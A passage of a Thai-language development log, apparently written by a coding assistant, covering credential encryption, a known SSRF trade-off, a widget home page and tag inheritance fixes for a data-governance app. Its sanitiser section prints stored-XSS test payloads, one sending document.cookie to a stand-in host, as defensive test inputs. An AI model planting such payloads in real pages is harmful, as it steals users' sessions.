+ที่แย่กว่านั้นคือ **product เราเองไม่สอดคล้องกัน** — M11 ให้ผู้ใช้พิมพ์ API key ของ LLM ลงหน้าจอตรงๆ แล้ว seal ด้วย Fernet (`llm_user_setting.api_key_cipher`) แต่ data source กลับบังคับให้ไป env var ทั้งที่ความเสี่ยงของ data source **สูงกว่า** จึงเป็นการเข้มในที่ที่ไม่ได้ช่วย และผ่อนในที่ที่คนใช้งานจริง
+
+**ตัดสินใจ: รับทั้งสองแบบ** ใครมี Vault ก็ยังชี้ `vault://` ได้เหมือนเดิม ใครไม่มีก็พิมพ์ลงหน้าจอได้ โดยมี compensating control ที่ต้องไม่หายไปไหน (AO.3)
+
+### AO.3 ⚠️ กติกาที่ห้ามถอด — ciphertext ต้องไม่ถูกส่งกลับไปที่ browser
+
+ทางเดินของ credential ที่พิมพ์เอง:
+
+```
+browser: {username, password}
+   │
+   ▼ SourceResource.withCredential(...)
+SecretBox.seal("user:password")      ← Fernet, key = FERNET_KEY
+   │
+   ▼
+DataSourceStore เห็นแค่  "fernet:<ciphertext>"   ← validate() ยังทำงานเหมือนเดิม
+   │                                               แถวใน DB ไม่เคยมี plaintext
+   ▼ ทุก response ที่มี Source ผ่าน redact()
+browser ได้กลับ          "fernet:stored"          ← ไม่ใช่ ciphertext
+```
+
+- **`redact()` ต้องถูกเรียกในทุก endpoint ที่คืน `Source`** — ตอนนี้คือ `list()` / `get()` / `create()` / `update()` / `setEnabled()` ถ้ามี endpoint ใหม่ที่คืน `Source` แล้วลืม redact คือ ciphertext หลุดออก API ทันที
+- คำว่า `stored` อยู่ที่เดียวคือ `CredentialResolver.STORED` แล้ว `SourceResource` อ้างค่านั้น เพื่อไม่ให้สองฝั่งเพี้ยนกัน
+- `CredentialResolver` **ปฏิเสธ `fernet:stored`** อย่างชัดเจนพร้อมข้อความที่บอกว่าเกิดอะไรขึ้น เพราะถ้าเผลอรับ มันจะกลายเป็น source ที่ต่อด้วย credential ว่างเปล่า
+- ฟอร์มแก้ไขส่ง `credentialRef` กลับมาทุกครั้ง → ถ้าส่ง `fernet:stored` มา `withCredential()` จะ **เอา ref เดิมในแถวมาใส่คืน** ไม่ใช่เขียนคำว่า `stored` ทับ ciphertext จริง (บั๊กนี้ถ้าหลุดไป = password หายทั้งชุดตอนคนกด Save โดยไม่ได้แก้อะไรเลย)
+
+### AO.4 🐛 ดักได้ก่อนขึ้น — resolver ที่ไม่มีกุญแจ
+
+ตอนแรก `JdbcIntrospector` กับ `QueryExecutor` ต่างคนต่าง `new CredentialResolver()` ด้วย constructor เปล่า ซึ่ง **ไม่มี opener** แปลว่า:
+
+- `POST /v1/sources/test` เขียว (เพราะ `SourceProbe` ได้ resolver ที่มีกุญแจ)
+- แล้ว crawl ไม่ได้ query ไม่ได้ ขึ้นว่า credential ใช้ไม่ได้
+
+คือ source ที่ **เทสต์ผ่านแล้วพังทีหลัง** ซึ่งเป็นอาการที่หาสาเหตุยากที่สุด แก้โดยสร้าง `CredentialResolver` **ตัวเดียว** ใน `DacApplication` แล้วส่งให้ทั้งสามคนใช้ (`JdbcIntrospector` · `SourceProbe` · `QueryExecutor`) และย้าย `SecretBox` ขึ้นไปสร้างก่อน source registry
+
+> ถ้าจะเพิ่มอะไรที่เปิด connection ไป source ในอนาคต **ให้รับ `CredentialResolver` เข้ามา อย่าสร้างเอง**
+
+### AO.5 ครึ่งเดียวไม่รับ
+
+`username` มาแต่ `password` ว่าง (หรือกลับกัน) → **400** ไม่ใช่ปล่อยผ่าน
+
+เพราะถ้าปล่อยผ่าน มันจะตกไปเข้าเส้นทาง "ใช้ ref เดิม" แปลว่า **คนเปลี่ยนชื่อ user แล้วกด Save สำเร็จ แต่ระบบยังต่อด้วย login เดิม** — หน้าจอบอกอย่าง ของจริงเป็นอีกอย่าง ฝั่ง UI ก็เขียนบอกไว้ตรงๆ ว่าเว้นว่างทั้งคู่ = เก็บของเดิม กรอกทั้งคู่ = เปลี่ยน
+
+### AO.6 หน้าจอ — `SourcesPage.tsx`
+
+- กล่อง **Credential** มีสวิตช์สองโหมด: **Username and password** / **Secret store** สลับโหมดแล้วล้างค่าของอีกโหมดทิ้ง (กันค่าค้างที่มองไม่เห็นถูกส่งไป)
+- ปุ่ม **Test connection** อยู่ในฟอร์ม ยิง `POST /v1/sources/test` ด้วยสิ่งที่พิมพ์อยู่ **โดยยังไม่บันทึกอะไร** — endpoint นี้ admin-only และถ้าเป็นการแก้ source เดิมจะส่ง `id` ไปด้วยเพื่อให้ server เติมค่าที่ไม่ได้กรอก (รวมถึง credential ที่ seal ไว้แล้ว) ให้เอง
+- ผลเทสต์ถูกล้างทิ้งทุกครั้งที่แก้ฟอร์ม — ผลลัพธ์ที่วัดกับ host เดิมแต่ยังค้างอยู่บนหน้าจอ อ่านเป็นคำรับประกันของ host ใหม่
+- การ์ด source แสดงคำว่า **Stored, encrypted** แทนที่จะโชว์ `fernet:stored` ดิบๆ
+
+### AO.7 ทดสอบกับ Postgres จริงที่ผู้ใช้ให้มา
+
+ผู้ใช้ส่ง database จริงมาให้ทดสอบ (`<host>` · db `arakdb` · user `arak`) พร้อมสั่ง **`ห้ามยุ่งกับ db อื่น`** — สคริปต์ทั้งชุดอ่าน host/db/user/password จาก environment ไม่มีค่าไหนถูกเขียนลงไฟล์ และแตะเฉพาะ `arakdb`
+
+**19/19 เขียว** กับ backend ที่รันอยู่จริง:
+
+| # | เคส | ผล |
+|---|---|---|
+| 1 | Test ก่อน save ด้วยค่าที่พิมพ์สดๆ | ✅ `PostgreSQL 16.15` ตอบใน 331 ms |
+| 2 | การ test ต้องไม่ลงทะเบียนอะไรเลย | ✅ ไม่มีแถวใหม่ |
+| 3 | password ผิด | ✅ `reachable: false` |
+| 4 | ข้อความ error ต้องไม่สะท้อน password กลับมา | ✅ |
+| 5 | register ด้วย credential ที่พิมพ์เอง | ✅ |
+| 6–8 | `create()` / `get()` / `list()` ต้องตอบ `fernet:stored` | ✅ ทั้งสาม |
+| 9–10 | ไม่มี response ไหนมี password หรือ ciphertext | ✅ |
+| 11 | credential ที่ seal ไว้เปิด connection ได้ | ✅ |
+| 12–13 | แก้ source โดยไม่พิมพ์ password ซ้ำ แล้วยังต่อได้ | ✅ (พิสูจน์ AO.3 ข้อสุดท้าย) |
+| 14–15 | ใส่ username เปล่าๆ ถูกปฏิเสธ และของเดิมไม่ถูกแตะ | ✅ 400 |
+| 16 | `credentialRef` เป็น plaintext ยังถูกปฏิเสธเหมือนเดิม | ✅ 400 |
+| 17 | introspect ทำงานผ่าน credential ที่ seal ไว้ | ✅ |
+
+> introspect คืน 0 table — ตรวจซ้ำกับ `psql` แล้ว `arakdb` มีแค่ schema `public` และ **ว่างจริง** ไม่ใช่บั๊กของ introspector
+>
+> ⚠️ password ของ database นี้ถูกวางในแชต **ควร rotate** และตอนนี้มันถูกเก็บแบบ Fernet-sealed อยู่ใน app DB ของ dev เครื่องนี้เท่านั้น (source ชื่อ `arak-live-pg`)
+
+### AO.8 M11 — LLM ต่อ per-user สำเร็จจริงแล้ว ไม่ใช่ "ยังไม่เริ่ม"
+
+ตารางใน Current Progress เขียนว่า M11 `⬜ ยังไม่เริ่ม` ซึ่งเก่าไปมาก ของที่ใช้งานได้จริงตอนนี้:
+
+- **แต่ละคนตั้ง endpoint และ key ของตัวเอง** ในหน้า Settings แล้วเลือกเองว่าจะเปิดใช้ไหม — ไม่ใช่ config ที่ส่วนกลาง (ผู้ใช้ย้ำข้อนี้: *"User เป็นคนที่ Set Endpoint และ key ของตัวเองนะ แล้วเลือกเองว่าตัวเองจะใช้หรือไม่"*)
+- `llm_user_setting.base_url` + `api_key_cipher` (Fernet) · key ไม่เคยถูกส่งกลับ ตอบแค่ `hasOwnKey`
+- `llm_provider.allow_personal` เป็น kill switch ระดับ deployment
+- ⚠️ **`LlmResource.putUser` จงใจตัดสิทธิ์ admin ให้แก้ได้แค่ `enabled`** — `UserEdit(edit.enabled(), null, null, null, null)` ไม่มีใครเขียน gateway ของคนอื่นได้ รวมถึง PLATFORM_ADMIN **ห้ามผ่อนข้อนี้**
+- ทดสอบสดผ่านแล้ว: list models ได้ 21 ตัว และ completion ผ่าน key ของ `analyst_a` เอง
+
+เหลือของจริงสองตัวคือ **NL→SQL** และ **ร่าง policy** (ซึ่งต้องออกมาเป็น `DRAFT` เท่านั้นตาม FR-2.6)
+
+### AO.9 ⚠️ Trade-off ที่บันทึกไว้ — `LlmGatewayUrl` ยอมให้ private range
+
+`LlmGatewayUrl.validate()` ปฏิเสธเฉพาะ loopback / link-local / any-local และ **ยอมให้ RFC 1918** โดยตั้งใจ เพราะ gateway ของผู้ใช้เองอยู่ใน private range — ถ้าห้าม ฟีเจอร์นี้ใช้ไม่ได้เลยในองค์กรที่ต้องใช้
+
+นี่คือ SSRF surface ที่รู้ตัว: คนที่ signed-in ตั้ง base URL ไปที่ IP ภายในได้ แล้ว server จะยิงไปให้ ตัวคุมที่มีอยู่คือ
+
+1. ต้อง signed-in และแก้ได้เฉพาะของตัวเอง
+2. `llm_provider.allow_personal` ปิดทั้ง feature ได้ทันที
+3. response ไม่ได้ถูกส่งกลับดิบๆ — ผ่าน shape ของ chat completion
+
+**ห้าม "ปรับให้ปลอดภัยขึ้น" ด้วยการไปห้าม private range** เว้นแต่ผู้ใช้สั่งเอง
+
+### AO.10 เทสต์ที่เพิ่ม
+
+`CredentialResolverTest` (dac-connector-source — โมดูลนี้ไม่เคยมี test มาก่อน) **11 tests**
+
+- `fernet:` round-trip · password ที่มี `:` หลายตัวต้องไม่ถูกตัด
+- resolver ที่ไม่มีกุญแจต้องบอกว่า **ไม่มี `FERNET_KEY`** ไม่ใช่บอกว่า credential เสีย (นี่คือเคสของ AO.4)
+- `fernet:stored` ต้องถูกปฏิเสธ
+- plaintext ที่ open ออกมาแล้วไม่มี `:` ต้องถูกปฏิเสธ ไม่ใช่เดา
+- opener ที่ throw ต้องรายงานเหตุผล
+- `env:` ครบทั้งเจอ/ไม่เจอ/ชื่อ scheme ที่ไม่มีใครทำ/reference ว่าง
+
+---
+
+---
+
+### AO.11 — สองเรื่องที่ผู้ใช้เจอหน้า Sources หลังของขึ้น
+
+**(1) 🐛 กด Edit source แล้วเห็น source อื่นโผล่มาข้างล่างด้วย** — แก้แล้ว (`SourcesPage.tsx`)
+
+ฟอร์มเปิดอยู่ข้างบน แต่รายการ source ทั้งหมดยังถูก render ต่อข้างล่างเหมือนเดิม ผลคือ:
+
+- **source ที่กำลังแก้อยู่โผล่สองที่** — ฟอร์มข้างบน กับการ์ดของตัวเองอีกใบห่างลงไปไม่กี่ร้อยพิกเซล
+- **ปุ่ม Edit / Disable / Remove ของ source ตัวอื่นอยู่ในระยะเอื้อม** ระหว่างที่คนกำลังแก้อีกตัวหนึ่ง — กดพลาดแล้วฟอร์มที่พิมพ์ค้างไว้หายทันที
+
+แก้เป็น: **ระหว่างที่ฟอร์มเปิด หน้านี้แสดงแค่ฟอร์ม** (ทั้งตอน Register และตอน Edit) รายการ + สถานะ Loading ถูกซ่อนด้วย `editing === null` หัวฟอร์มบอกอยู่แล้วว่ากำลังแก้ตัวไหน (`Edit <name>`) และปุ่ม Cancel พากลับมาที่รายการ
+
+```tsx
+{/* The form stands alone. A list underneath it repeats the source being
+    edited a second time, a few hundred pixels below its own form, and
+    puts every other source's Edit and Remove button within reach of
+    somebody who is in the middle of changing this one. */}
+{sources && sources.length > 0 && editing === null && (
+```
+
+**(2) "Connect database ใหม่ ยังไม่เห็นที่ให้กรอก password ยังเป็น Credential reference"** — ของอยู่ครบ แต่ **หน้าจอที่เปิดค้างไว้เป็น bundle เก่า**
+
+ตรวจแล้วทุกชั้น ณ เวลาที่ถาม:
+
+| ตรวจอะไร | ผล |
+|---|---|
+| `SourcesPage.tsx` ในดิสก์ | มีบล็อก Credential + ปุ่ม `Username and password` / `Secret store` ครบ |
+| `dist/assets/index-*.js` | มีสตริงทั้ง `Username and password`, `Secret store`, `Stored, encrypted`, `Opens one read-only connection` |
+| 8080 / 8090 / 3000 | เสิร์ฟ bundle ตัวเดียวกันหมด (hash ตรงกับดิสก์) |
+
+**หลักฐานชิ้นที่ชี้ขาด:** ในภาพที่ส่งมา การ์ดเขียนว่า `Credential fernet:stored` — แต่โค้ดปัจจุบันไม่มีทางพิมพ์แบบนั้นได้เลย มันจะพิมพ์ **`Stored, encrypted`** (`isSealed()` ครอบไว้) แปลว่าแท็บนั้นโหลด JS ไว้ตั้งแต่ก่อน build รอบ 01:31
+
+> **กฎที่ต้องจำ:** แก้ `frontend/app/src` แล้ว **คนใช้ยังไม่เห็นอะไรเลย** จนกว่าจะ `VITE_BASE=/Arak/ npx vite build` — และแท็บที่เปิดค้างไว้ก่อนหน้านั้นก็ยังถือ bundle เก่าอยู่จนกว่าจะรีเฟรช รอบนี้ hash เปลี่ยนเป็น `index-CUESUuy2.js` แล้ว รีโหลดหน้าเดียวก็เห็น
+
+**อีกเคสที่หน้าตาเหมือนกันแต่ถูกต้อง:** กด Edit ใส่ source ที่ credential เป็น `env:SRC_PG_ARAK_CREDENTIAL` (เช่น `demo-pg`) ฟอร์มจะ**เปิดมาที่โหมด Secret store** ซึ่งก็คือช่อง "Credential reference" ตัวเดิม — ตั้งใจให้เป็นแบบนั้น เพราะ source นั้นชี้ vault/env อยู่จริง ถ้าจะเปลี่ยนไปพิมพ์ user/password ให้กดปุ่ม **Username and password** ที่หัวบล็อก Credential
+
+## รอบก่อนหน้า — **หน้าแรกที่แต่ละคนจัดเอง (M12)** · **Requestor ไม่เจอ governance อีกแล้ว** · และ 🐛 **บั๊กที่ทำให้ "เซฟแล้วเหมือนไม่ติด"**
+
+### AN.1 โจทย์จากผู้ใช้ — สองข้อที่ต่อกัน
+
+> `หน้าแรกของ Requestor ก้ต้องไม่เห็น policy governance ต่างๆ สิ ให้เป็นหน้า Search Global Search ไปได้ไหม คล้ายๆหน้าแรกของ Openmetadata แต่เอาให้เข้า theme ของเรา`
+> `หน้าแรก ตรงนี้อยากให้สามรถ Customize ได้ ตาม User / มี Object ให้เลือก มีกราฟ สามารถจัดวางได้หลายแบบ`
+> `สามารถวาง Link วาง HTML, วาง Video แล้ว Render แสดงผลได้`
+
+สองข้อนี้เป็นเรื่องเดียวกัน ถ้าหน้าแรกจัดเองได้ "หน้าแรกของ Requestor" ก็คือ **default คนละใบ** ไม่ใช่หน้าใหม่ที่ต้องเขียนแยก
+เลยทำเป็นระบบเดียว: layout เก็บต่อ account · default ขึ้นกับว่า account นั้นทำหน้าที่อะไร · และ governance widget **ไม่ถูกเสนอ** ให้ account ที่ไม่ได้ governance
+
+### AN.2 โครงที่ลงไป
+
+| ชั้น | ไฟล์ | บรรทัด |
+|---|---|---|
+| Migration | `V13__home_layout.sql` | 1 แถวต่อ account · `layout jsonb` · **ไม่มีแถว = default** (ลบแถว = reset) |
+| Model | `home/HomeLayout.java` | 149 |
+| **Sanitiser** | `home/HomeLayoutValidator.java` | 403 |
+| Store | `home/HomeLayoutStore.java` | 234 |
+| REST | `resources/HomeResource.java` | 100 — `GET` / `PUT` / `DELETE /v1/home/layout` |
+| API client | `frontend/app/src/api/home.ts` | 97 |
+| Preset | `pages/home/presets.ts` | 89 |
+| Widget catalogue | `pages/home/widgets.tsx` | 922 |
+| กราฟ | `pages/home/charts.tsx` | 238 |
+| Editor | `pages/home/HomeEditor.tsx` | 627 |
+| หน้า | `pages/HomePage.tsx` | 267 |
+
+**โมเดล** — layout คือ preset + รายการ widget ที่ปักไว้ว่าอยู่คอลัมน์ไหน
+ลำดับในคอลัมน์ = ลำดับใน list เฉยๆ **ไม่มี field position** เพราะ field แบบนั้นจะหลุดจาก array ที่ถือมันอยู่เสมอเมื่อมีคนย้าย widget
+
+```
+Preset   SINGLE(1) · HALVES(2) · WIDE_LEFT(2) · WIDE_RIGHT(2) · THIRDS(3)
+Widget   { id, type, column, title?, config }
+Layout   { preset, widgets[] }
+```
+
+เลือกเป็น **preset ไม่ใช่กริดอิสระ** เพราะคนที่จัดหน้าแรกกำลังเลือก *รูปทรง* ไม่ได้เขียน CSS grid — และแปลว่าพฤติกรรมตอนจอแคบเขียนครั้งเดียวต่อ preset ไม่ใช่คำนวณจากตัวเลขที่คนพิมพ์มา
+
+**Widget 14 ตัว** — `SEARCH` · `RECENT_POLICIES` · `GOVERNANCE_COVERAGE` · `SOURCES` · `VOCABULARY` · `PLATFORM` · กราฟ 4 ตัว (`CHART_ASSETS_BY_TYPE` / `CHART_POLICIES_BY_STATE` / `CHART_POLICIES_BY_SCOPE` / `CHART_SOURCES_BY_MODE`) · `LINKS` · `NOTE` · `HTML` · `VIDEO`
+
+**กราฟวาด SVG เอง ไม่ลง chart library** และ **การย้าย widget ใช้ปุ่มขึ้น/ลง ไม่ลง drag-and-drop library** — เพิ่ม dependency สองตัวเพื่อฟีเจอร์เดียวไม่คุ้ม และปุ่มขึ้น/ลงคือทางเดียวที่คนใช้คีย์บอร์ดจัดหน้าได้
+
+### AN.3 default คนละใบ และเหตุผลที่มันไม่ใช่เรื่อง security
+
+| account | default |
+|---|---|
+| governance (`PLATFORM_ADMIN` / `POLICY_AUTHOR` / `DATA_OWNER` / `AUDITOR`) | `WIDE_LEFT` + 5 panel เดิมเป๊ะ — `RECENT_POLICIES`, `GOVERNANCE_COVERAGE`, `SOURCES`, `VOCABULARY`, `PLATFORM` |
+| `REQUESTER` | `SINGLE` **นำด้วย `SEARCH`** · ไม่มี governance panel สักตัว |
+
+default ของ governance ถูก pin ไว้ด้วยเทสต์ว่า **ต้องเท่ากับหน้าที่เคยมี ทั้งชนิดและคอลัมน์** — คนที่ไม่เคยเปิด editor เลยต้องดูไม่ออกว่ามันมีอยู่
+
+> ⚠️ **การกรองนี้คือ "เมนู ไม่ใช่รั้ว"** — endpoint ที่อยู่หลัง governance panel ทุกตัว **ตอบ account ที่ล็อกอินแล้วทุกคนโดยตั้งใจ** เพราะคนที่โดนปฏิเสธข้อมูลต้องดูออกว่า policy ตัวไหนปฏิเสธเขา การหด panel ออกจากหน้าแรกไม่ได้หดสิทธิ์ใคร เขียนคำนี้ไว้ทั้งใน `HomeLayout.WidgetType#governance()` และหัวไฟล์ `HomePage.tsx` เป็นคำเดียวกับที่ navigation rail ใช้ด้วยเหตุผลเดียวกัน
+
+ผลพลอยได้ที่ตั้งใจ: หน้าของ requester **ไม่ยิง request ที่หน้าไม่ได้ใช้** — widget ดึงข้อมูลของตัวเอง ไม่ใช่หน้าดึง 5 อย่างแล้วแจกลงมา (TanStack dedupe ด้วย query key อยู่แล้ว สอง widget ที่อ่าน endpoint เดียวกันยังยิงครั้งเดียว) มีเทสต์จับข้อนี้ตรงๆ เพราะหน้าที่กรอง markup ออกแต่ยังยิง query เบื้องหลัง **ดูถูกและผิด**
+
+### AN.4 🐛 บั๊กจริง — "เซฟแล้วเหมือนไม่ติด"
+
+เจอตอนยิง e2e จริงกับ backend ที่รันอยู่ ไม่ได้เจอจาก unit test
+
+**อาการ:** `analyst_a` (REQUESTER) เพิ่ม panel `RECENT_POLICIES` แล้วกด Save → panel **โผล่ขึ้นมา** อยู่จนกด refresh แล้ว **หายไป**
+
+**สาเหตุ** สองที่ต่อกัน:
+1. `HomeResource.save` ไม่เคยส่ง role ของคนเรียกลงไปเลย
+2. `HomeLayoutStore.save` คืน `clean` ดิบๆ ไม่ได้คืน `forRole(clean, …)`
+
+และที่ทำให้มันโผล่มาให้เห็นคือฝั่งหน้าเว็บ — `HomePage.tsx` ทำ
+
+```ts
+const accept = (next) => { client.setQueryData(['home-layout'], next); setDraft(null); };
+```
+
+**หน้าเว็บวาดสิ่งที่ PUT ตอบกลับ ไม่ได้อ่านใหม่** → reply ที่ไม่ได้กรอง = panel ที่ไม่ควรมี อยู่จนกว่าจะ reload
+ซึ่งสำหรับคนใช้มันอ่านออกมาเป็น **"เซฟไม่ติด"** ไม่ใช่ "panel นี้ไม่ใช่ของคุณ"
+
+**ที่แก้:** `save()` คืน layout ที่ **กรองตาม role ของคนที่เซฟ** แต่ **แถวใน DB ยังเก็บครบ**
+
+```java
+Layout clean = validator.clean(layout);
+…
+return new LayoutView(forRole(clean, governanceReader), false, now, actor);
+```
+
+สองอย่างนี้ **ตั้งใจให้ไม่เหมือนกัน** — แถวเก็บครบเพื่อว่าวันที่ account นั้นได้ role เพิ่ม panel เก่ากลับมาเอง ส่วน reply ต้องเท่ากับหน้าที่จะได้ตอน reload พอดี
+
+> เทสต์ที่ปักเรื่องนี้ไว้คือ `HomeLayoutStoreIT` (Testcontainers, 6 เทสต์) — ทั้ง `saveIsFilteredForTheCaller` (reply กรองแล้ว **และ** อ่านซ้ำต้องได้เท่ากัน) และ `theStoredRowIsNotFiltered` (อ่านแถวเดิมด้วยสายตา governance ต้องเห็นครบ) เพราะถ้าเขียนแต่ unit test ของตัวกรอง บั๊กนี้มองไม่เห็นเลย
+
+### AN.5 HTML ที่คนพิมพ์เอง = stored XSS — `HomeLayoutValidator`
+
+ข้อ `สามารถวาง Link วาง HTML, วาง Video แล้ว Render` แปลว่ามี **markup ที่คนพิมพ์ ถูก render กลับเข้า session ของคนที่อ่าน** ซึ่งใน product นี้คือช่องเดียวที่ markup กลายเป็นสิทธิ์ — script ที่ยิงจาก dashboard จะวิ่งด้วยสิทธิ์ของคนอ่านไปหา policy API
+
+กติกาที่บังคับ (ทุกอย่างอยู่ใน `HomeLayoutValidator` และ **ทำความสะอาดทั้งตอนเขียนและตอนอ่าน**):
+
+| config | รูปร่างที่ยอม |
+|---|---|
+| `HTML` | `{html}` — jsoup `Safelist.basicWithImages()` + heading + table · เพดาน **20,000 ตัวอักษร** |
+| `NOTE` | `{text}` เพดาน 4,000 |
+| `LINKS` | `{links:[{label,url,note?}]}` สูงสุด 12 · URL เพดาน 2,000 |
+| `VIDEO` | `{url, kind:'EMBED'\|'FILE', caption?}` — **allowlist: YouTube / Vimeo หรือไฟล์ตรง `.mp4`/`.webm`/`.ogg`** |
+| กราฟ 4 ตัว | `{shape:'DONUT'\|'BARS'}` |
+| `RECENT_POLICIES` / `SOURCES` | `{limit}` หนีบไว้ที่ 3..12 |
+| ที่เหลือ | `{}` |
+
+เพดานอื่น: widget สูงสุด 24 · title 80 ตัวอักษร · **ทุกการปฏิเสธตอบ HTTP 400** (ไม่ใช่ 422)
+
+> หมายเหตุที่เขียนคอมเมนต์ไว้ใน code แล้วและอย่าไปแก้: **เพดาน 20,000 ตัด "ก่อน" jsoup ทำงาน** — jsoup pretty-print ใส่ newline ต่อ element ทำให้สตริงที่เก็บจริงยาวกว่าเพดานได้ ~12% ตัดทีหลังจะได้ HTML ที่ขาดกลางแท็ก
+
+### AN.6 ยิงจริงกับ backend ที่รันอยู่ — 40 เคส
+
+เขียน `home_e2e.py` ยิง `PUT/GET/DELETE /api/v1/home/layout` ด้วย token จริงของ `analyst_a` และ `admin` (ไฟล์อยู่ใน scratchpad ไม่ได้ commit)
+
+ผลหลังแก้บั๊ก **ผ่านครบ 40** รวมของที่ตั้งใจยิงให้พัง:
+
+```
+<p onclick="steal()">hi</p><script>alert(1)</script>
+<img src=x onerror="fetch('//evil.test?c='+document.cookie)">
+<a href="javascript:alert(2)">click</a><iframe src="//evil.test"></iframe>
+```
+
+กลับมาเป็น
+
+```
+<p>hi</p><img><a rel="nofollow noopener noreferrer" target="_blank">click</a>
+```
+
+และ **แถวใน DB ก็สะอาด** — `HomeLayoutStoreIT.hostileHtmlNeverReachesTheDatabase` อ่าน `SELECT layout::text FROM home_layout` ดิบๆ เพื่อพิสูจน์ข้อนี้ เพราะ sanitiser ที่ล้างแต่ขาออกจะทิ้ง payload ไว้ใน DB ให้ของที่อ่านทีหลัง (report, export, endpoint ในอนาคต) ไปเจอ
+
+เคสอื่นที่ยืนยันแล้ว: preset มั่ว / widget type มั่ว / widget เกิน 24 / `javascript:` ใน link / video host นอก allowlist → **400 ทั้งหมด** · title ยาวเกิน / id ซ้ำ / column นอกช่วง / link เกิน 12 / URL ยาวเกิน → **หนีบให้** · ไม่มี token → **401** · page ของคนหนึ่งไม่ใช่ของอีกคน · `DELETE` คืน default
+
+### AN.7 สิ่งที่ยัง "เหมือนเดิม" โดยตั้งใจ
+
+5 panel เดิมถูก **ยกข้ามมาทั้งดุ้น** ไม่ได้เขียนใหม่ให้ใกล้เคียง — markup เดิมเป๊ะ
+banner ด้านบนเปลี่ยนเฉพาะ **ปุ่ม** ให้ตรงกับ account: คนที่เขียน policy ไม่ได้ เคยโดนยื่นปุ่ม `New policy` เป็น action หลัก ซึ่งเป็นปุ่มที่มีไว้ปฏิเสธเขา — ตอนนี้เป็น `Explore the catalog` / `Run a query`
+
+### AN.8 เทสต์
+
+| ชุด | จำนวน |
+|---|---|
+| `HomeLayoutValidatorTest` | 305 บรรทัด |
+| `HomeLayoutStoreTest` | 7 |
+| **`HomeLayoutStoreIT`** (Testcontainers) | **6 — ใหม่รอบนี้** |
+| `pages/home/layout.test.ts` | 12 |
+| `pages/HomePage.test.tsx` | 9 |
+
+---
+
+## รอบก่อนหน้า — 🐛 **ARAK แต่ง metadata ที่ OpenMetadata ไม่มี** — Column Tag เยอะเกินจริง เพราะเรา "ตกทอด" tag ลง column เอง
+
+### AM.1 ผู้ใช้ทักว่า Column Tag ใน ARAK ไม่ตรงกับ OpenMetadata
+
+ผู้ใช้เปิด table `customers` ใน OpenMetadata เทียบกับ ARAK แล้วถามว่า
+
+> `Column Tag ไม่เห็นจะตรงกับที่เห็นใน Arak เลย`
+> `ทำไม Column Tag เยอะแยะไปหมด ใน Arak ผิดหรือเปล่า Recheck ให้ดีนะ ตอน ingest ทำงานถูกไหม`
+
+ใน OpenMetadata tab Columns ของ `customers` มี **3 column และ 1 tag ต่อ column พอดี**
+
+| column | tag ใน OpenMetadata |
+|---|---|
+| `created_at` | `PII.NonSensitive` |
+| `id` | `PII.NonSensitive` |
+| `name` | `MFEC-PDPA.Sentitive (ข้อมูลส่วนบุคคลอ่อนไหว)` |
+
+ใน ARAK column เดียวกันมีชิปเต็มแถว รวมทั้ง `PII.Sensitive` บน `name` ทั้งที่ OpenMetadata บอกว่า `name` เป็น `MFEC-PDPA` ไม่ใช่ `PII`
+
+#### ตรวจก่อนแก้ — **ingest ไม่ได้ผิด**
+
+ไล่ดูที่ตารางจริงก่อน ไม่เดา:
+
+```bash
+MSYS_NO_PATHCONV=1 docker exec dac-appdb psql -U dac -d dac -c "
+select target_fqn, facet_type, facet_fqn, depth, is_direct, coalesce(inherited_from,'-')
+from asset_facet
+where target_fqn like 'dtp-iprm.iprm.public.customers.%'"
+```
+
+ได้ **39 แถว** — แต่ในนั้นมี `is_direct = true` อยู่ **3 แถวพอดี** และตรงกับหน้าจอ OpenMetadata ทีละตัว
+ที่เหลืออีก 36 แถวคือของที่ **ARAK คิดขึ้นเอง** ไม่ใช่ของที่ดูดมาผิด
+
+> **สรุปให้ผู้ใช้:** การ ingest ถูกต้อง 100% — เก็บมา 3 column, 3 tag ตรงตามต้นทาง ปัญหาอยู่ที่ชั้นคำนวณหลัง ingest
+
+### AM.2 คำถามที่ตามมา และเป็นคำถามที่ถูกต้อง
+
+> `Inherit นี่มันมีด้วยหรอใน Openmetdata ถ้าไม่มี ทำไมต้อง Inherit ด้วยอะ metadata`
+
+คำตอบตรงๆ: **OpenMetadata inherit แค่บางอย่าง ไม่ได้ inherit ทุกอย่าง**
+
+| facet | OpenMetadata ตกทอดลงชั้นล่างไหม |
+|---|---|
+| **Domain** | ✅ ตกทอด service → database → schema → table |
+| **Owners** | ✅ ตกทอด |
+| Classification tag | ❌ **ไม่** — tag ผูกกับ entity ที่คนไปติดเท่านั้น |
+| Glossary term | ❌ ไม่ |
+| Tier / Certification | ❌ ไม่ |
+
+ARAK ไปตกทอด **ทุก facet** ลง column ตาม FR-2A.1 ซึ่งเขียนไว้กว้างเกินจริง → กลายเป็นการ **แต่ง metadata ที่ต้นทางไม่มี**
+
+#### และมันไม่ใช่แค่เรื่องรก — เป็นบั๊กความถูกต้องของ policy
+
+data policy ที่เขียนว่า
+
+```
+mask ทุก column ที่  tags contains 'PII'
+```
+
+เมื่อ table ติด `PII.Sensitive` ไว้ **ทุก column ของ table นั้นจะ match** → ติด tag ที่ table หนึ่งครั้ง เท่ากับ **null ทั้งตาราง** โดยไม่มีใครตั้งใจ
+`created_at` กับ `id` ที่ steward จงใจติด `PII.NonSensitive` ไว้ ก็ยังโดน mask เพราะมันรับ `PII.Sensitive` ของ table มาด้วย
+
+### AM.3 วิธีแก้ — จำกัดให้เหลือเท่าที่ OpenMetadata ทำจริง
+
+`FacetInheritance.effective(...)` เพิ่ม allow-list แล้วกรองที่ต้นทาง
+
+```java
+/**
+ * The facet types that cross from one asset to the one below it.
+ *
+ * <p>Chosen to match OpenMetadata's behaviour rather than to be generous. ...
+ */
+private static final Set<FacetType> INHERITABLE =
+    EnumSet.of(
+        FacetType.DOMAINS,
+        FacetType.DATA_PRODUCTS,
+        FacetType.OWNERS,
+        FacetType.CUSTOM_PROPERTY);
+```
+
+```java
+for (ExtractedFacet facet : level.facets()) {
+  if (!INHERITABLE.contains(facet.facetType())) {
+    continue;
+  }
+  ...
+}
+```
+
+**ทำไมเก็บ `CUSTOM_PROPERTY` ไว้ ทั้งที่ OpenMetadata ไม่ตกทอด** — เพราะ OpenMetadata นิยาม custom property ต่อ entity type และ **column ถือ custom property ไม่ได้เลย** ถ้าไม่ตกทอด expression
+
+```
+user.country == asset.prop('dataResidency')
+```
+
